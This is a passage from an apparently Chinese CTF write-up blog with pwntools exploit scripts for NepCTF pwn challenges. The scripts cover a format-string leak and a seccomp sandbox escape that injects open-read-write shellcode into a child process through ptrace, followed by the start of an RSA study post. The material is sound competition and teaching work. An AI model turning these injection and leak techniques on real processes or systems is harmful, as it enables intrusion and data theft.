class="line">io.sendlineafter(<span class="string">b&quot;please input your name:\n&quot;</span>, leak_payload.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分阶段读取文件</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>, <span class="string">b&quot;time&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>, <span class="string">b&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>理论上是可以的但是没通，实际上也是可以的，因为别的师傅打出来，我没复现出来。</p>
<p>原作者的exp(<a href="https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0</a>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=remote(<span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">name=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">12</span>+<span class="number">9</span>&#125;</span>$p&quot;</span>.encode()</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    name+=<span class="string">f&quot;-%<span class="subst">&#123;<span class="number">13</span>+<span class="number">9</span>+i&#125;</span>$p&quot;</span>.encode()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;please input your name:\n&quot;</span>,name)</span><br><span class="line">file=<span class="string">b&quot;time&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>,file)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>,<span class="string">b&quot;flag&quot;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>官方exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./time&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name:\n&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;%28$p.%27$p.%26$p.%25$p.%24$p.%23$p.%22$p.%21$p.%20$p&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1000000</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>





<h2 id="smallbox"><a href="#smallbox" class="headerlink" title="smallbox"></a>smallbox</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap((<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>) == (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] please input your shellcode: &quot;</span>);</span><br><span class="line">    v4 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL);</span><br><span class="line">    install_seccomp();</span><br><span class="line">    MEMORY[<span class="number">0xDEADC0DE000</span>]();  <span class="comment">//执行shellcode</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们可以看到父线程开启了sandbox的保护，子进程没有但是子进程是个无限循环。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mmap((<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>) == (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L </span><br></pre></td></tr></table></figure>

<p>在0xDEADC0DE000上创建了RWX(可读,可写，可执行）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo -ne &quot;expected_input&quot; | seccomp-tools dump ./smallbox</span><br><span class="line">[+] please input your shellcode: </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只能用ptrace</p>
<p>所以攻击思路就是在子进程里用ORW，在到父进程执行，具体怎么绕过无限循环能先看exp(大佬原创的，我纯黏贴)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b read&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;[+] please input your shellcode: &quot;</span>)</span><br><span class="line">shellcode =asm(<span class="string">&quot;mov r14d, DWORD PTR [rbp-0xc]&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已获得子进程pid&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;orw</span></span><br><span class="line"><span class="string">0xdeadc0de000:  0x010101010101b848  0x672e2fb848500101</span></span><br><span class="line"><span class="string">0xdeadc0de010:  0x043148010166606d  0xf631d231e7894824</span></span><br><span class="line"><span class="string">0xdeadc0de020:  0x01ba41050f58026a  0x0301f28141010102</span></span><br><span class="line"><span class="string">0xdeadc0de030:  0x6ad2315f016a0101  0x00050f58286a5e03</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">16</span>,<span class="string">&quot;r14&quot;</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rcx,0x500000000</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    sub rcx,1</span></span><br><span class="line"><span class="string">    test rcx,rcx</span></span><br><span class="line"><span class="string">    jnz loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;进程附加成功&quot;</span>)</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">12</span>,<span class="string">&quot;r14&quot;</span>,<span class="number">0</span>,<span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&quot;mov rsp,0xDEADC0DE588;mov rax, 0xDEADC0DE000;push rax;mov rsp,0xDEADC0DE800&quot;</span>)</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>,<span class="number">0x010101010101b848</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">8</span>,<span class="number">0x672e2fb848500101</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x10</span>,<span class="number">0x043148010166606d</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x18</span>,<span class="number">0xf631d231e7894824</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x20</span>,<span class="number">0x01ba41050f58026a</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x28</span>,<span class="number">0x0301f28141010102</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x30</span>,<span class="number">0x6ad2315f016a0101</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x38</span>,<span class="number">0x00050f58286a5e03</span>))</span><br><span class="line"><span class="comment">#================================================================================================================</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">13</span>,<span class="string">&quot;r14&quot;</span>,<span class="number">0</span>,<span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br><span class="line"><span class="comment">#================================================================================================================</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">17</span>,<span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&quot;jmp $&quot;</span>)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>ptrace请求类型详解</p>
<ol>
<li><code>PTRACE_ATTACH</code> (16)</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">16</span>, <span class="string">&quot;r14&quot;</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：将当前进程附加到目标进程作为调试器</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID（子进程）</li>
</ul>
</li>
<li><strong>效果</strong>：<ul>
<li>使子进程进入暂停状态（相当于发送SIGSTOP）</li>
<li>父进程成为子进程的调试器，可以完全控制子进程</li>
</ul>
</li>
<li><strong>系统调用号</strong>：<code>__NR_ptrace = 101</code>，请求类型为16</li>
</ul>
<ol start="2">
<li><code>PTRACE_GETREGS</code> (12)</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">12</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：获取目标进程的寄存器状态</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID</li>
<li><code>0</code>：忽略参数</li>
<li><code>0xDEADC0DE500</code>：寄存器数据存储位置</li>
</ul>
</li>
<li><strong>效果</strong>：<ul>
<li>将子进程的所有寄存器值复制到<code>0xDEADC0DE500</code>位置</li>
<li>结构体大小为<code>sizeof(user_regs_struct) = 216字节</code></li>
</ul>
</li>
<li><strong>目的</strong>：为后续修改寄存器做准备</li>
</ul>
<ol start="3">
<li><code>PTRACE_POKETEXT</code> (5)</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>, <span class="number">0x010101010101b848</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：向目标进程内存写入数据</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID</li>
<li><code>0xDEADC0DE000</code>：写入地址</li>
<li><code>0x010101010101b848</code>：写入的8字节数据</li>
</ul>
</li>
<li><strong>关键特性</strong>：<ul>
<li>每次调用只能写入<strong>8字节</strong>数据</li>
<li>需要多次调用写入完整shellcode</li>
</ul>
</li>
</ul>
<p>4.<code>PTRACE_SETREGS</code> (13)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">13</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：设置目标进程的寄存器状态</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID</li>
<li><code>0</code>：忽略参数</li>
<li><code>0xDEADC0DE500</code>：寄存器数据来源位置</li>
</ul>
</li>
<li><strong>效果</strong>：<ul>
<li>将<code>0xDEADC0DE500</code>处的寄存器数据恢复到子进程</li>
<li>关键点：虽然恢复了寄存器，但此时子进程的代码已被覆盖</li>
</ul>
</li>
</ul>
<ol start="5">
<li><code>PTRACE_DETACH</code> (17)</li>
</ol>
<p>python</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.ptrace(17, &quot;r14&quot;, 0, 0))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：分离调试器与目标进程</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID</li>
<li><code>0</code>：忽略参数</li>
<li><code>0</code>：发送给子进程的信号（0表示无信号）</li>
</ul>
</li>
<li><strong>效果</strong>：<ul>
<li>子进程恢复执行</li>
<li>父进程不再控制子进程</li>
</ul>
</li>
</ul>
<p>阶段1: 附加和控制子进程</p>
<ol>
<li><p><strong>PTRACE_ATTACH(16)</strong></p>
<ul>
<li>父进程附加到子进程</li>
<li>子进程暂停执行</li>
</ul>
</li>
<li><p><strong>延时循环</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rcx,0x500000000</span><br><span class="line">loop:</span><br><span class="line">  sub rcx,1</span><br><span class="line">  jnz loop</span><br></pre></td></tr></table></figure>

<ul>
<li>目的：确保附加操作完成（替代waitpid）</li>
<li>原理：给内核时间处理附加请求</li>
</ul>
</li>
</ol>
<p>阶段2: 准备内存操作</p>
<ol>
<li><p><strong>PTRACE_GETREGS(12)</strong></p>
<ul>
<li>保存子进程当前寄存器状态</li>
<li>存储到共享内存的0x500偏移处</li>
</ul>
</li>
<li><p><strong>调整父进程栈指针</strong></p>
<p>asm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rsp,0xDEADC0DE588</span><br><span class="line">mov rax, 0xDEADC0DE000</span><br><span class="line">push rax</span><br><span class="line">mov rsp,0xDEADC0DE800</span><br></pre></td></tr></table></figure>

<ul>
<li>目的：避免后续操作破坏父进程栈</li>
<li>将栈移到共享内存的安全区域</li>
</ul>
</li>
</ol>
<p>阶段3: 注入恶意代码</p>
<ol>
<li><p><strong>8次PTRACE_POKETEXT(5)调用</strong></p>
<ul>
<li><p>向子进程内存写入64字节ORW shellcode</p>
</li>
<li><p>覆盖子进程原来的循环代码：</p>
<p>asm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 原始代码 (被覆盖)</span><br><span class="line">while(1): </span><br><span class="line">   jmp $   ; 机器码: EB FE</span><br><span class="line"></span><br><span class="line">; 覆盖后代码</span><br><span class="line">movabs rax,0x101010101010101  ; 新指令</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<p>阶段4: 恢复执行</p>
<ol>
<li><strong>PTRACE_SETREGS(13)</strong><ul>
<li>“恢复”子进程寄存器</li>
<li>实际效果：RIP仍指向被覆盖的代码区域</li>
</ul>
</li>
<li><strong>PTRACE_DETACH(17)</strong><ul>
<li>分离父进程和子进程</li>
<li>子进程从当前RIP开始执行（即ORW shellcode）</li>
</ul>
</li>
</ol>
<p>阶段5: 维持进程</p>
<ol>
<li><p><strong>父进程挂起</strong></p>
<p>asm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp $   ; 无限循环</span><br></pre></td></tr></table></figure>

<ul>
<li>防止父进程退出导致程序终止</li>
<li>保持子进程继续运行</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xDEADC0DE000:</span><br><span class="line">  ; 设置文件路径 &quot;flag&quot;</span><br><span class="line">  mov rax, 0x67616c662f2e   ; &quot;./flag&quot;</span><br><span class="line">  push rax</span><br><span class="line">  </span><br><span class="line">  ; 系统调用序列</span><br><span class="line">  mov rdi, rsp      ; 文件路径指针</span><br><span class="line">  xor esi, esi      ; O_RDONLY (0)</span><br><span class="line">  xor eax, eax      ; 清空RAX</span><br><span class="line">  mov al, 2         ; syscall号: open=2</span><br><span class="line">  syscall           ; 调用open(&quot;flag&quot;)</span><br><span class="line">  </span><br><span class="line">  ; 读取文件内容</span><br><span class="line">  mov rdi, rax      ; 文件描述符</span><br><span class="line">  mov rsi, rsp      ; 缓冲区地址</span><br><span class="line">  mov rdx, 0x100    ; 读取长度</span><br><span class="line">  xor eax, eax      ; syscall号: read=0</span><br><span class="line">  syscall           ; 调用read()</span><br><span class="line">  </span><br><span class="line">  ; 输出到标准输出</span><br><span class="line">  mov rdi, 1        ; 文件描述符: stdout=1</span><br><span class="line">  mov rsi, rsp      ; 缓冲区地址</span><br><span class="line">  mov rdx, rax      ; 实际读取长度</span><br><span class="line">  mov al, 1         ; syscall号: write=1</span><br><span class="line">  syscall           ; 调用write()</span><br><span class="line">  </span><br><span class="line">  ; 退出</span><br><span class="line">  mov al, 60        ; syscall号: exit=60</span><br><span class="line">  syscall</span><br></pre></td></tr></table></figure>

<p>我就了解到这里了，还是太菜，多学吧wuuu~~~</p>
<p>官方exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./smallbox&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">PTRACE_GETREGS = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line">PTRACE_POKETEXT = <span class="number">4</span></span><br><span class="line">PTRACE_POKEDATA = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">injected_shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag.txt&quot;</span>,<span class="number">0</span>)+<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">injected_shellcode=asm(injected_shellcode)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    /* ptrace(request=0x10, vararg_0=pid, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">    xor r10d, r10d /* 0 */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_ATTACH&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x14]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /* ptrace(request=0xc, vararg_0=pid vararg_1=0x0, vararg_2=shellcode+0x800) */</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">    push r10</span></span><br><span class="line"><span class="string">    add r10,0x800</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_GETREGS&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x14]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    add rdx,0x880</span></span><br><span class="line"><span class="string">    mov rdx,[rdx]</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rbx,0</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    /* ptrace(request=0xc, vararg_0=pid vararg_1=rip+i, vararg_2=[shellcode+i+0x200]) */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_POKETEXT&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">    push r10</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    add rdx,rbx</span></span><br><span class="line"><span class="string">    mov r10,[r10+rbx+0x200]</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x1C]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    add rbx,8</span></span><br><span class="line"><span class="string">    cmp rbx,0x100</span></span><br><span class="line"><span class="string">    jle loop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ptrace(request=0x10, vararg_0=pid, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">    xor r10d, r10d /* 0 */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_DETACH&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x1C]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode).ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)+injected_shellcode</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;shellcode:&#x27;</span>,shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>wp</category>
      </categories>
  </entry>
  <entry>
    <title>RSA</title>
    <url>/2025/07/29/RSA/</url>
    <content><![CDATA[<p>开始RSA的学习</p>
<p>RSA加密过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = ;q = ;（两个质数）</span><br><span class="line">n = p * q</span><br><span class="line">φ(n) = (p-1)*(q-1)</span><br><span class="line">e = 公钥指数(与φ(n)互质)</span><br><span class="line">m = 明文</span><br><span class="line">c ≡ m^e (mod n)</span><br></pre></td></tr></table></figure>

<p>(d * e) mod φ(n) &#x3D; 1</p>
<p>公钥: (e, n)</p>
<p>私钥: (d, n)</p>
<p>解密过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m ≡ c^d (mod n)</span><br></pre></td></tr></table></figure>

<p>例题1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> totient</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power_tower_mod</span>(<span class="params">a, k, m</span>):  <span class="comment"># a↑↑k mod m</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> a % m</span><br><span class="line">    exp = power_tower_mod(a, k - <span class="number">1</span>, totient(m))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, <span class="built_in">int</span>(exp), <span class="built_in">int</span>(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = <span class="number">123456</span></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n_phi= p+q-<span class="number">1</span></span><br><span class="line">x=power_tower_mod(n_phi + <span class="number">1</span>, r, <span class="built_in">pow</span>(n_phi, <span class="number">3</span>))</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x = <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886</span></span><br><span class="line"><span class="string">x = 522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

